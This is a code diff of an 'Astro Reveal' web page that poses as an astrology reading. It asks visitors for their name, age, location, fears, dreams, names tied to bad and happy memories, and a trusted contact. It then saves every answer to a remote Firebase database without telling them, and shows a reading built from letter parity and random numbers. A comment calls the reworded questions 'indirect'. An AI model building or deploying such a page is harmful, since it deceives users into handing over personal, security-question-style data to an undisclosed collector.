@@ -1,220 +1,219 @@
-<!DOCTYPE html>    
-<html lang="en">    
-<head>    
-<meta charset="UTF-8">    
-<meta name="viewport" content="width=device-width, initial-scale=1.0">    
-<title>Astro Reveal ✨</title>    
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">    
-
-<style>    
-body {    
-  margin: 0;    
-  font-family: 'Poppins', sans-serif;    
-  background: radial-gradient(circle at top, #0f0c29, #302b63, #24243e);    
-  color: white;    
-  display: flex;    
-  justify-content: center;    
-  align-items: center;    
-  height: 100vh;    
-  overflow: hidden;    
-}    
-
-.container {    
-  width: 90%;    
-  max-width: 400px;    
-  text-align: center;    
-}    
-
-.card {    
-  background: rgba(255,255,255,0.05);    
-  padding: 25px;    
-  border-radius: 20px;    
-  backdrop-filter: blur(10px);    
-  box-shadow: 0 0 20px rgba(255,255,255,0.1);    
-}    
-
-input {    
-  width: 100%;    
-  padding: 12px;    
-  margin-top: 15px;    
-  border-radius: 10px;    
-  border: none;    
-}    
-
-button {    
-  margin-top: 20px;    
-  padding: 12px 20px;    
-  border: none;    
-  border-radius: 20px;    
-  background: linear-gradient(45deg, #ff6ec4, #7873f5);    
-  color: white;    
-  cursor: pointer;    
-}    
-
-.result-card {
-  background: rgba(255,255,255,0.07);
-  margin-top: 15px;
-  padding: 15px;
-  border-radius: 15px;
-  text-align: left;
-}
-</style>    
-</head>    
-
-<body>    
-
-<div class="container">    
-  <div class="card" id="card">    
-    <h2 id="question">Enter your name</h2>    
-    <input id="input" placeholder="Type here...">    
-    <button onclick="next()">Next ✨</button>    
-  </div>    
-</div>    
-
-<!-- ✅ Firebase v10 (MODULAR) -->
-<script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyAbYt_z5GaqOTcVlz3FRjssTwC7Uzv_MdA",
-  authDomain: "information-b9593.firebaseapp.com",
-  projectId: "information-b9593",
-  storageBucket: "information-b9593.firebasestorage.app",
-  messagingSenderId: "767588407430",
-  appId: "1:767588407430:web:006bb7ff0b7c66b751d907",
-  measurementId: "G-CZ9KF73J6T"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-let step = 0;        
-let answers = [];        
-
-const questions = [        
-  "What do people usually call you?",        
-  "Your age",        
-  "Your place",        
-  "Pick a number that always feels lucky to you 🍀",        
-  "A name that brings bad memories",        
-  "Think of a name that brings a smile to your face 😊",        
-  "Your future plan",        
-  "What scares you the most in life?",        
-  "Your dream",        
-  "If something went wrong, whose number would you dial without thinking? 📞"        
-];        
-
-window.next = function () {
-  const input =
-document.getElementById("input");        
-  if(input.value.trim() === "") return;      
-
-  answers.push(input.value);        
-  input.value = "";        
-  step++;        
-
-  if (step < questions.length) {        
-    document.getElementById("question").innerText = questions[step];        
-  } else {        
-    loadingScreen();        
-  }        
-}
-
-function loadingScreen(){      
-  document.getElementById("card").innerHTML = `      
-    <h2>🔮 Reading Your Stars...</h2>      
-    <p>Analyzing cosmic energy...</p>      
-  `;      
-  setTimeout(showResult, 2500);      
+<!DOCTYPE html>      
+<html lang="en">      
+<head>      
+<meta charset="UTF-8">      
+<meta name="viewport" content="width=device-width, initial-scale=1.0">      
+<title>Astro Reveal ✨</title>      
+  
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">      
+  
+<style>      
+body {      
+  margin: 0;      
+  font-family: 'Poppins', sans-serif;      
+  background: radial-gradient(circle at top, #0f0c29, #302b63, #24243e);      
+  color: white;      
+  display: flex;      
+  justify-content: center;      
+  align-items: center;      
+  height: 100vh;      
+  overflow: hidden;      
 }      
-
-function letterValue(name){  
-  return name.trim().toLowerCase().charCodeAt(0) - 96;  
+  
+.container {      
+  width: 90%;      
+  max-width: 400px;      
+  text-align: center;      
+}      
+  
+.card {      
+  background: rgba(255,255,255,0.05);      
+  padding: 25px;      
+  border-radius: 20px;      
+  backdrop-filter: blur(10px);      
+  box-shadow: 0 0 20px rgba(255,255,255,0.1);      
+}      
+  
+input {      
+  width: 100%;      
+  padding: 12px;      
+  margin-top: 15px;      
+  border-radius: 10px;      
+  border: none;      
+}      
+  
+button {      
+  margin-top: 20px;      
+  padding: 12px 20px;      
+  border: none;      
+  border-radius: 20px;      
+  background: linear-gradient(45deg, #ff6ec4, #7873f5);      
+  color: white;      
+  cursor: pointer;      
+}      
+  
+.result-card {  
+  background: rgba(255,255,255,0.07);  
+  margin-top: 15px;  
+  padding: 15px;  
+  border-radius: 15px;  
+  text-align: left;  
 }  
-
-function calculateMarriageLetter(name, loveName, hateName){
-  let total = name.length + loveName.length;
-  if(total > 26) total -= hateName.length;
-  while(total > 26) total -= 26;
-  return String.fromCharCode(96 + total);
-}
-
-function generateAstroResult(){  
-  const name = answers[0];  
-  const hateName = answers[4];  
-  const loveName = answers[5];  
-
-  const mainVal = letterValue(name);  
-  const hateVal = letterValue(hateName);  
-  const loveVal = letterValue(loveName);  
-
-  return {  
-    futureOutcome: (hateVal % 2 === 0) ? "stable" : "challenging",  
-    successOutcome: (loveVal % 2 === 0) ? "success" : "effort needed",  
-    lifePhase: (mainVal % 2 === 0) ? "positive" : "tough",  
-    timePeriod: Math.floor(Math.random()*12+1) + " months",
-    marriageLetter: calculateMarriageLetter(name, loveName, hateName)
-  };  
+</style>      
+</head>      
+  
+<body>      
+  
+<div class="container">      
+  <div class="card" id="card">      
+    <h2 id="question">Enter your name</h2>      
+    <input id="input" placeholder="Type here...">      
+    <button onclick="next()">Next ✨</button>      
+  </div>      
+</div>      
+  
+<script type="module">  
+  
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";  
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";  
+  
+const firebaseConfig = {  
+  apiKey: "AIzaSyAbYt_z5GaqOTcVlz3FRjssTwC7Uzv_MdA",  
+  authDomain: "information-b9593.firebaseapp.com",  
+  projectId: "information-b9593",  
+  storageBucket: "information-b9593.firebasestorage.app",  
+  messagingSenderId: "767588407430",  
+  appId: "1:767588407430:web:006bb7ff0b7c66b751d907",  
+  measurementId: "G-CZ9KF73J6T"  
+};  
+  
+const app = initializeApp(firebaseConfig);  
+const db = getFirestore(app);  
+  
+let step = 0;          
+let answers = [];          
+  
+// 🔥 UPDATED QUESTIONS (clean + simple + indirect)
+const questions = [          
+  "What do people usually call you?",          
+  "How old are you right now?",          
+  "Where are you from?",          
+  "Pick a number that feels lucky to you 🍀",          
+  "A name you don’t like hearing",          
+  "A name that makes you happy 😊",          
+  "What do you want to do in your future?",          
+  "What are you most afraid of?",          
+  "What is your biggest dream?",          
+  "Who do you trust the most?"          
+];          
+  
+window.next = function () {  
+  const input = document.getElementById("input");   // ✅ FIXED BUG        
+  if(input.value.trim() === "") return;        
+  
+  answers.push(input.value);          
+  input.value = "";          
+  step++;          
+  
+  if (step < questions.length) {          
+    document.getElementById("question").innerText = questions[step];          
+  } else {          
+    loadingScreen();          
+  }          
 }  
-
-async function showResult() {        
-  const r = generateAstroResult();  
-
+  
+function loadingScreen(){        
   document.getElementById("card").innerHTML = `        
-    <h2>✨ Astrology Reading ✨</h2>        
-
-    <div class="result-card">
-      Life Phase: <b>${r.lifePhase}</b>
-    </div>
-
-    <div class="result-card">
-      Future: <b>${r.futureOutcome}</b>
-    </div>
-
-    <div class="result-card">
-      Success: <b>${r.successOutcome}</b>
-    </div>
-
-    <div class="result-card">
-      Time: <b>${r.timePeriod}</b>
-    </div>
-
-    <div class="result-card">
-      Marriage Letter: <b>${r.marriageLetter.toUpperCase()}</b>
-    </div>
+    <h2>🔮 Reading Your Stars...</h2>        
+    <p>Analyzing cosmic energy...</p>        
   `;        
-
-  await saveToFirebase(r);  
+  setTimeout(showResult, 2500);        
+}        
+  
+function letterValue(name){    
+  return name.trim().toLowerCase().charCodeAt(0) - 96;    
+}    
+  
+function calculateMarriageLetter(name, loveName, hateName){  
+  let total = name.length + loveName.length;  
+  if(total > 26) total -= hateName.length;  
+  while(total > 26) total -= 26;  
+  return String.fromCharCode(96 + total);  
 }  
-
-async function saveToFirebase(result){      
-  try {
-    await addDoc(collection(db, "astro_users"), {      
-      name: answers[0],
-      age: answers[1],
-      place: answers[2],
-      luckyNumber: answers[3],
-      hateName: answers[4],
-      loveName: answers[5],
-      futurePlan: answers[6],
-      fear: answers[7],
-      dream: answers[8],
-      trustPerson: answers[9],
-      result: result,
-      createdAt: serverTimestamp()
-    });
-
-    console.log("Saved to Firebase ✅");
-
-  } catch (error) {
-    console.error("Error saving:", error);
-  }
-}
-
-</script>  
-
-</body>    
+  
+function generateAstroResult(){    
+  const name = answers[0];    
+  const hateName = answers[4];    
+  const loveName = answers[5];    
+  
+  const mainVal = letterValue(name);    
+  const hateVal = letterValue(hateName);    
+  const loveVal = letterValue(loveName);    
+  
+  return {    
+    futureOutcome: (hateVal % 2 === 0) ? "stable" : "challenging",    
+    successOutcome: (loveVal % 2 === 0) ? "success" : "effort needed",    
+    lifePhase: (mainVal % 2 === 0) ? "positive" : "tough",    
+    timePeriod: Math.floor(Math.random()*12+1) + " months",  
+    marriageLetter: calculateMarriageLetter(name, loveName, hateName)  
+  };    
+}    
+  
+async function showResult() {          
+  const r = generateAstroResult();    
+  
+  document.getElementById("card").innerHTML = `          
+    <h2>✨ Astrology Reading ✨</h2>          
+  
+    <div class="result-card">  
+      Life Phase: <b>${r.lifePhase}</b>  
+    </div>  
+  
+    <div class="result-card">  
+      Future: <b>${r.futureOutcome}</b>  
+    </div>  
+  
+    <div class="result-card">  
+      Success: <b>${r.successOutcome}</b>  
+    </div>  
+  
+    <div class="result-card">  
+      Time: <b>${r.timePeriod}</b>  
+    </div>  
+  
+    <div class="result-card">  
+      Marriage Letter: <b>${r.marriageLetter.toUpperCase()}</b>  
+    </div>  
+  `;          
+  
+  await saveToFirebase(r);    
+}    
+  
+async function saveToFirebase(result){        
+  try {  
+    await addDoc(collection(db, "astro_users"), {        
+      name: answers[0],  
+      age: answers[1],  
+      place: answers[2],  
+      luckyNumber: answers[3],  
+      hateName: answers[4],  
+      loveName: answers[5],  
+      futurePlan: answers[6],  
+      fear: answers[7],  
+      dream: answers[8],  
+      trustPerson: answers[9],  
+      result: result,  
+      createdAt: serverTimestamp()  
+    });  
+  
+    console.log("Saved to Firebase ✅");  
+  
+  } catch (error) {  
+    console.error("Error saving:", error);  
+  }  
+}  
+  
+</script>    
+  
+</body>      
 </html>
